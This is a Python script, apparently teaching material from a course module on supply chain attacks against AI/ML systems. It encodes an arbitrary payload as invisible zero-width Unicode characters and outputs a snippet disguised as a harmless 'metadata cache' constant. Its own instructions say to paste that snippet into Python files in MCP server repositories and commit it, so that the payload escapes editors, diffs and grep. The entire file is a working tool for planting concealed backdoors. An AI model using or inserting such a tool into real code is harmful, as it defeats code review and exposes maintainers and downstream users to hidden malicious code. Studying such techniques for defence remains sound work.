#!/usr/bin/env python3
"""
Script: zwc_encode.py
Module: 08 — Supply Chain Attacks on AI/ML Systems
Purpose: Encode a payload as zero-width Unicode characters (U+200B/U+200C) for steganographic backdoor
Usage: python3 zwc_encode.py <payload_file> [--output zwc_string.txt] [--variable _CACHE_META]
Target: Python source files in MCP server repos — payload hidden in string constants
Notes:
  U+200B (zero-width space)       = bit 0
  U+200C (zero-width non-joiner) = bit 1
  Encoding: MSB first per byte
  Result is invisible in editors, GitHub diff, and grep
"""

import sys
import argparse

ZWC_ZERO = "​"  # zero-width space
ZWC_ONE  = "‌"  # zero-width non-joiner

def encode_payload(data: bytes) -> str:
    """Encode bytes as zero-width Unicode string (MSB first)."""
    zwc = ""
    for byte in data:
        for bit in range(7, -1, -1):
            zwc += ZWC_ONE if (byte >> bit) & 1 else ZWC_ZERO
    return zwc

def decode_payload(zwc: str) -> bytes:
    """Decode zero-width Unicode string back to bytes."""
    bits = [1 if c == ZWC_ONE else 0 for c in zwc if c in (ZWC_ZERO, ZWC_ONE)]
    out = bytearray()
    for i in range(0, len(bits) - 7, 8):
        byte = 0
        for j in range(8):
            byte = (byte << 1) | bits[i + j]
        out.append(byte)
    return bytes(out)

def main():
    parser = argparse.ArgumentParser(description="Encode payload as zero-width Unicode steganography")
    parser.add_argument("payload_file", help="File containing the payload to encode")
    parser.add_argument("--output", default="-", help="Output file (default: stdout)")
    parser.add_argument("--variable", default="_CACHE_META",
                        help="Python variable name to embed ZWC in (default: _CACHE_META)")
    parser.add_argument("--decode", action="store_true",
                        help="Decode a ZWC string from payload_file instead")
    args = parser.parse_args()

    with open(args.payload_file, "rb") as f:
        data = f.read()

    if args.decode:
        result = decode_payload(data.decode("utf-8"))
        sys.stdout.buffer.write(result)
        return

    zwc = encode_payload(data)

    # Generate Python snippet ready to paste into target file
    snippet = (
        f'# Metadata cache identifier\n'
        f'{args.variable} = "{zwc}"\n'
        f'# ^ Appears blank in editors — contains {len(data)} bytes of encoded data\n'
    )

    if args.output == "-":
        print(snippet)
    else:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(snippet)
        print(f"[+] ZWC snippet written to {args.output}")
        print(f"[+] Payload: {len(data)} bytes → {len(zwc)} ZWC characters")
        print(f"[+] Variable: {args.variable}")
        print(f"[!] Insert snippet into target .py file and commit")

    # Verification
    decoded = decode_payload(zwc)
    assert decoded == data, "Round-trip verification FAILED"
    print(f"[+] Round-trip verification: OK")

if __name__ == "__main__":
    main()
